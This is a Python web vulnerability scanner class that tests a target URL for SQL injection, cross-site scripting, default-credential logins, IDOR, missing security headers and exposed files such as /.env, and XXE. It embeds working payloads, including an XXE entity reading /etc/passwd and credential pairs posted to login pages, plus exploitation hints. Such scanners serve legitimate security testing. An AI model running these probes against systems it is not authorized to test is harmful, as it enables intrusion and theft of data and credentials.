import requests
import re
from urllib.parse import urljoin, urlparse
import time

class OWASPTester:
    """OWASP Top 10 Vulnerability Tester"""
    
    def __init__(self, target_url):
        self.target = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'SecureSight-Scanner/1.0'
        })
        self.results = []
        self.logs = []
    
    def log(self, message, type="info"):
        """Add log entry"""
        self.logs.append({"message": message, "type": type, "timestamp": time.time()})
    
    def test_sql_injection(self):
        """Test for SQL Injection vulnerabilities"""
        self.log("🔍 Testing SQL Injection...", "info")
        payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin' --",
            "1' OR '1'='1",
            "' UNION SELECT NULL--",
        ]
        
        for payload in payloads:
            try:
                test_url = f"{self.target}?id={payload}"
                response = self.session.get(test_url, timeout=5)
                
                sql_errors = [
                    "SQL syntax", "mysql_fetch", "mysqli", "PostgreSQL",
                    "ORA-", "SQLite", "ODBC", "JET Database"
                ]
                
                for error in sql_errors:
                    if error.lower() in response.text.lower():
                        self.log(f"✅ SQL Injection found with payload: {payload}", "success")
                        self.log(f"   Location: URL parameter 'id'", "detail")
                        self.log(f"   Evidence: {error} error in response", "detail")
                        return {
                            "vulnerable": True,
                            "payload": payload,
                            "location": "URL parameter 'id'",
                            "evidence": f"SQL error detected: {error}",
                            "severity": "CRITICAL",
                            "impact": "Attacker can extract entire database contents including usernames, passwords, credit cards, and personal data. Can also modify or delete data, and potentially execute system commands on the database server.",
                            "exploitation": f"Visit {self.target}?id={payload} to trigger SQL error. Use tools like sqlmap to automate full database extraction."
                        }
            except:
                pass
        
        self.log("❌ No SQL Injection vulnerabilities found", "fail")
        return {"vulnerable": False}
    
    def test_xss(self):
        """Test for Cross-Site Scripting"""
        self.log("🔍 Testing Cross-Site Scripting (XSS)...", "info")
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
        ]
        
        for payload in payloads:
            try:
                test_url = f"{self.target}?search={payload}"
                response = self.session.get(test_url, timeout=5)
                
                if payload in response.text:
                    self.log(f"✅ XSS vulnerability found with payload: {payload}", "success")
                    self.log(f"   Location: 'search' parameter", "detail")
                    self.log(f"   Evidence: Payload reflected without sanitization", "detail")
                    return {
                        "vulnerable": True,
                        "payload": payload,
                        "location": "'search' parameter",
                        "evidence": "Payload reflected in response",
                        "severity": "HIGH",
                        "impact": "Attacker can steal user sessions, redirect users to malicious sites, deface the website, or install keyloggers to capture credentials. Victims' browsers will execute malicious JavaScript.",
                        "exploitation": f"Send victim a link like {self.target}?search={payload} - when they click it, their session cookies are stolen and sent to attacker's server."
                    }
            except:
                pass
        
        self.log("❌ No XSS vulnerabilities found", "fail")
        return {"vulnerable": False}
    
    def test_broken_auth(self):
        """Test for Broken Authentication"""
        self.log("🔍 Testing Broken Authentication...", "info")
        common_creds = [
            ("admin", "admin"),
            ("admin", "password"),
            ("admin", "123456"),
            ("root", "root"),
            ("test", "test"),
        ]
        
        login_paths = ["/login", "/admin", "/signin", "/auth"]
        
        for path in login_paths:
            try:
                login_url = urljoin(self.target, path)
                response = self.session.get(login_url, timeout=5)
                
                if response.status_code == 200:
                    for username, password in common_creds:
                        data = {"username": username, "password": password}
                        login_response = self.session.post(login_url, data=data, timeout=5)
                        
                        if "dashboard" in login_response.text.lower() or \
                           "welcome" in login_response.text.lower() or \
                           login_response.status_code == 302:
                            self.log(f"✅ Weak credentials found: {username}:{password}", "success")
                            self.log(f"   Location: {login_url}", "detail")
                            self.log(f"   Evidence: Successfully authenticated", "detail")
                            return {
                                "vulnerable": True,
                                "credentials": f"{username}:{password}",
                                "location": login_url,
                                "evidence": f"Logged in with {username}:{password}",
                                "severity": "CRITICAL",
                                "impact": "Attacker gains full administrative access to the application. Can view all user data, modify settings, create backdoor accounts, upload malware, or completely take over the system.",
                                "exploitation": f"Simply visit {login_url} and login with {username}:{password} to gain full admin access. No special tools needed."
                            }
            except:
                pass
        
        self.log("❌ No weak authentication found", "fail")
        return {"vulnerable": False}
    
    def test_idor(self):
        """Test for Insecure Direct Object Reference"""
        self.log("🔍 Testing IDOR (Insecure Direct Object Reference)...", "info")
        
        test_ids = [1, 2, 100, 999]
        paths = ["/user/", "/profile/", "/account/", "/api/user/", "/api/users/"]
        
        for path in paths:
            for user_id in test_ids:
                try:
                    test_url = urljoin(self.target, f"{path}{user_id}")
                    response = self.session.get(test_url, timeout=5, allow_redirects=True)
                    
                    # Check if final URL contains login/auth (means redirected)
                    if 'login' in response.url.lower() or 'auth' in response.url.lower():
                        self.log(f"   {test_url} redirects to login (secure)", "detail")
                        continue
                    
                    # Check response content for login indicators
                    response_lower = response.text.lower()[:1000]
                    login_indicators = ['login', 'sign in', 'signin', 'log in', 'unauthorized', 'forbidden', 'access denied', 'authentication required']
                    
                    if any(indicator in response_lower for indicator in login_indicators):
                        self.log(f"   {test_url} requires authentication (secure)", "detail")
                        continue
                    
                    # Check if we got actual user data (JSON or HTML with user info)
                    if response.status_code == 200 and len(response.text) > 100:
                        # Look for user data indicators
                        user_data_indicators = ['"id":', '"email":', '"username":', '"name":', '<div class="profile', '<div class="user']
                        
                        if any(indicator in response.text[:1000] for indicator in user_data_indicators):
                            self.log(f"✅ IDOR vulnerability found", "success")
                            self.log(f"   Location: {test_url}", "detail")
                            self.log(f"   Evidence: Accessed user data without authorization", "detail")
                            return {
                                "vulnerable": True,
                                "location": test_url,
                                "evidence": f"Accessed {test_url} without authorization",
                                "severity": "HIGH",
                                "impact": "Attacker can view other users' private data by simply changing ID numbers in the URL. Can access profiles, messages, orders, documents, and any other user-specific information.",
                                "exploitation": f"Visit {test_url} to view another user's data. Try different ID numbers (1, 2, 3, etc.) to enumerate all users and their information."
                            }
                except:
                    pass
        
        self.log("❌ No IDOR vulnerabilities found", "fail")
        return {"vulnerable": False}
    
    def test_security_misconfiguration(self):
        """Test for Security Misconfiguration"""
        self.log("🔍 Testing Security Misconfiguration...", "info")
        issues = []
        
        try:
            response = self.session.get(self.target, timeout=5)
            headers = response.headers
            
            if 'X-Frame-Options' not in headers:
                issues.append("Missing X-Frame-Options header")
            
            if 'X-Content-Type-Options' not in headers:
                issues.append("Missing X-Content-Type-Options header")
            
            if 'Strict-Transport-Security' not in headers and self.target.startswith('https'):
                issues.append("Missing HSTS header")
            
            if 'Content-Security-Policy' not in headers:
                issues.append("Missing CSP header")
            
            # Check for exposed sensitive files
            sensitive_files = [
                ("/.git/config", ["[core]", "repositoryformatversion"]),
                ("/.env", ["DB_", "APP_", "API_", "SECRET", "PASSWORD=", "KEY="]),
                ("/config.php", ["<?php", "$config", "define("]),
                ("/phpinfo.php", ["PHP Version", "phpinfo()"]),
                ("/admin", ["<title>Admin", "admin panel", "dashboard"]),
            ]
            
            for file, indicators in sensitive_files:
                test_url = urljoin(self.target, file)
                try:
                    resp = self.session.get(test_url, timeout=5, allow_redirects=True)
                    
                    # Check if we got redirected to login
                    if 'login' in resp.url.lower() or 'auth' in resp.url.lower():
                        continue
                    
                    # Check if response contains login page
                    resp_lower = resp.text.lower()[:2000]
                    login_keywords = ['login', 'sign in', 'signin', 'log in', 'password', 'username']
                    login_count = sum(1 for keyword in login_keywords if keyword in resp_lower)
                    
                    # If 3+ login keywords found, it's likely a login page
                    if login_count >= 3:
                        continue
                    
                    # Check if file is actually exposed with specific indicators
                    if resp.status_code == 200 and len(resp.text) > 20:
                        # Must match at least one indicator
                        if any(indicator in resp.text[:2000] for indicator in indicators):
                            issues.append(f"Exposed file: {file}")
                except:
                    pass
            
            if issues:
                self.log(f"✅ Security misconfigurations found", "success")
                for issue in issues:
                    self.log(f"   - {issue}", "detail")
                
                impact_parts = []
                exploit_parts = []
                
                if any("X-Frame-Options" in i for i in issues):
                    impact_parts.append("Site can be embedded in iframes for clickjacking attacks")
                    exploit_parts.append("Embed site in malicious iframe to trick users")
                
                if any("HSTS" in i for i in issues):
                    impact_parts.append("Traffic can be intercepted via man-in-the-middle attacks")
                    exploit_parts.append("Intercept HTTP traffic to steal credentials")
                
                if any("CSP" in i for i in issues):
                    impact_parts.append("No protection against XSS attacks")
                    exploit_parts.append("Inject malicious scripts without CSP blocking")
                
                if any("Exposed file" in i for i in issues):
                    exposed = [i.split(": ")[1] for i in issues if "Exposed file" in i]
                    impact_parts.append(f"Sensitive files accessible: {', '.join(exposed)}")
                    exploit_parts.append(f"Visit {self.target}{exposed[0]} to access sensitive files")
                
                return {
                    "vulnerable": True,
                    "location": "Server configuration",
                    "evidence": ", ".join(issues),
                    "severity": "MEDIUM",
                    "impact": ". ".join(impact_parts) + ".",
                    "exploitation": ". ".join(exploit_parts) + "."
                }
        except:
            pass
        
        self.log("❌ No security misconfigurations found", "fail")
        return {"vulnerable": False}
    
    def test_xxe(self):
        """Test for XML External Entity"""
        self.log("🔍 Testing XXE (XML External Entity)...", "info")
        
        xxe_payload = """<?xml version="1.0"?>
        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
        <foo>&xxe;</foo>"""
        
        try:
            response = self.session.post(
                self.target,
                data=xxe_payload,
                headers={'Content-Type': 'application/xml'},
                timeout=5
            )
            
            if "root:" in response.text or "/bin/bash" in response.text:
                self.log(f"✅ XXE vulnerability found", "success")
                self.log(f"   Location: XML endpoint", "detail")
                self.log(f"   Evidence: File disclosure via XXE", "detail")
                return {
                    "vulnerable": True,
                    "location": "XML endpoint",
                    "evidence": "XXE vulnerability - file disclosure possible",
                    "severity": "CRITICAL",
                    "impact": "Attacker can read any file on the server including /etc/passwd, database configs, source code, and private keys. Can also perform SSRF attacks to scan internal network or cause denial of service.",
                    "exploitation": f"Send XML payload with external entity to {self.target} to read server files. Can extract database credentials from config files and gain full system access."
                }
        except:
            pass
        
        self.log("❌ No XXE vulnerabilities found", "fail")
        return {"vulnerable": False}
    
    def run_all_tests(self):
        """Run all OWASP Top 10 tests"""
        self.log(f"🎯 Starting OWASP Top 10 tests on {self.target}", "start")
        self.log(f"════════════════════════════════════════", "separator")
        
        tests = [
            ("SQL Injection", self.test_sql_injection),
            ("Cross-Site Scripting (XSS)", self.test_xss),
            ("Broken Authentication", self.test_broken_auth),
            ("Insecure Direct Object Reference (IDOR)", self.test_idor),
            ("Security Misconfiguration", self.test_security_misconfiguration),
            ("XML External Entity (XXE)", self.test_xxe),
        ]
        
        results = []
        for name, test_func in tests:
            try:
                result = test_func()
                if result.get("vulnerable"):
                    results.append({
                        "title": f"{name} Vulnerability",
                        "severity": result.get("severity", "HIGH"),
                        "description": result.get("evidence", "Vulnerability detected"),
                        "payload": result.get("payload", ""),
                        "location": result.get("location", ""),
                        "credentials": result.get("credentials", ""),
                        "impact": result.get("impact", ""),
                        "exploitation": result.get("exploitation", "")
                    })
            except Exception as e:
                self.log(f"⚠️ Error testing {name}: {str(e)}", "error")
        
        self.log(f"════════════════════════════════════════", "separator")
        self.log(f"✅ Testing complete! Found {len(results)} vulnerabilities", "complete")
        
        return {"results": results, "logs": self.logs}
